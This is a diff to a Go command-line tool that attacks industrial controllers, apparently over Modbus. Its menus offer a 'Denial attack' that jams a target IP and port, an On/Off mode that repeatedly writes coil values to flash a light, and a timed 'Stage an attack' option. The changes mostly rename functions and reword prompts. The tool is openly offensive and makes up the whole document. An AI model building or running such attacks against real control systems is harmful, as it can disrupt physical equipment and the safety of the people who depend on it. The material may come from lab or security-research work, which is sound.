@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"strings"
 	"sync"
 	"time"
 
@@ -37,13 +38,13 @@ func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime
 	if selector {
 		go func() {
 			<-timer2.C
-			fmt.Println("Begining toggle")
-			go toggle(ip_address, port, coil, coil_val, cycle, timeCycle, cycleDelay) //cycle bool, timeCycle int, cycleDelay int)
+			fmt.Println("Begining On/Off")
+			go on_Off(ip_address, port, coil, coil_val, cycle, timeCycle, cycleDelay) //cycle bool, timeCycle int, cycleDelay int)
 		}()
 	} else {
 		go func() {
 			<-timer2.C
-			fmt.Println("Begining delayed attack")
+			fmt.Println("Begining Denial attack")
 			go denial(ip_address, port, jamming, runtime, coil, coil_val)
 		}()
 	}
@@ -92,13 +93,13 @@ func denial(ip_address string, port string, jamming int, runtime int, coil uint1
 	wait.Wait()
 }
 
-func toggle(ip_address string, port string, coil uint16, coil_value int, cycle bool, timeCycle int, cycleDelay int) {
+func on_Off(ip_address string, port string, coil uint16, coil_value int, cycle bool, timeCycle int, cycleDelay int) {
 	if cycle {
 		var isBreak bool
 		timer2 := time.NewTimer(time.Duration(timeCycle) * time.Second) //Do I want to use a timer or number of flashes?
 		go func() {
 			<-timer2.C
-			fmt.Println("Ending toggle")
+			fmt.Println("Ending On/Off cycle")
 			isBreak = true //Breaks the light flashing
 		}()
 		for {
@@ -162,21 +163,24 @@ func select_1_options() {
 	var coil_value int
 	fmt.Println("Enter a coil value:")
 	fmt.Scanln(&coil_value)
-	go denial(ip_address, port, jamming, runtime, coil, coil_value) //Should I return the values?
+	go denial(ip_address, port, jamming, runtime, coil, coil_value)
 }
 
 func select_2_options() {
 	var timeCycle int
 	var cycleDelay int
 	var cycle bool
-	fmt.Println("To cycle light enter 1, to toggle light enter 0")
-	fmt.Scanln(&cycle)
-	if cycle {
-		fmt.Println("Enter how long to repeat cycle for (in seconds)")
+	var cycleSelect string
+	fmt.Println("Do you wish to cycle On/Off in a loop? (y/n): ")
+	fmt.Scanln(&cycleSelect)
+	if strings.ToLower(cycleSelect) == "y" {
+		cycle = true
+		fmt.Println("Enter how long to repeat cycle for (in seconds): ")
 		fmt.Scanln(&timeCycle)
-		fmt.Println("Enter delay between cycle (in seconds)")
+		fmt.Println("Enter delay between cycle (in seconds): ")
 		fmt.Scanln(&cycleDelay)
 	} else {
+		cycle = false
 		timeCycle = 0
 		cycleDelay = 0
 	}
@@ -199,7 +203,7 @@ func select_2_options() {
 	fmt.Println("Enter a coil value:")
 	fmt.Scanln(&coil_value)
 
-	go toggle(ip_address, port, coil, coil_value, cycle, timeCycle, cycleDelay)
+	go on_Off(ip_address, port, coil, coil_value, cycle, timeCycle, cycleDelay)
 
 }
 
@@ -212,7 +216,7 @@ func select_3_options() {
 	var jamming int
 	var selector bool
 
-	fmt.Println("Enter 1 for toggle/cycle or 0 for denial")
+	fmt.Println("Enter 1 for On/Off or 0 for Denial")
 	fmt.Scanln(&selector)
 
 	fmt.Println("Enter an ip address")
@@ -234,13 +238,13 @@ func select_3_options() {
 	fmt.Scanln(&coil_value)
 
 	if selector {
-		fmt.Println("Enter 1 to cycle, enter 0 for on/off")
+		fmt.Println("Enter 1 to Cycle, enter 0 for On/Off")
 		fmt.Scanln(&cycle)
 		if cycle {
-			fmt.Println("Enter how long to repeat cycle for (in seconds)")
+			fmt.Println("Enter how long to repeat Cycle for (in seconds)")
 			fmt.Scanln(&timeCycle)
 
-			fmt.Println("Enter delay between cycle (in seconds)")
+			fmt.Println("Enter delay between Cycle (in seconds)")
 			fmt.Scanln(&cycleDelay)
 		} else {
 			timeCycle = 0
@@ -266,7 +270,7 @@ func select_3_options() {
 func main() {
 	for {
 		var userSelection int
-		fmt.Println("Enter: \n 1) For denial attack \n 2) Toggle \n 3) Stage an attack")
+		fmt.Println("Enter: \n 1) For Denial attack \n 2) On/Off \n 3) Stage an attack")
 		fmt.Scanln(&userSelection)
 
 		if userSelection == 1 {
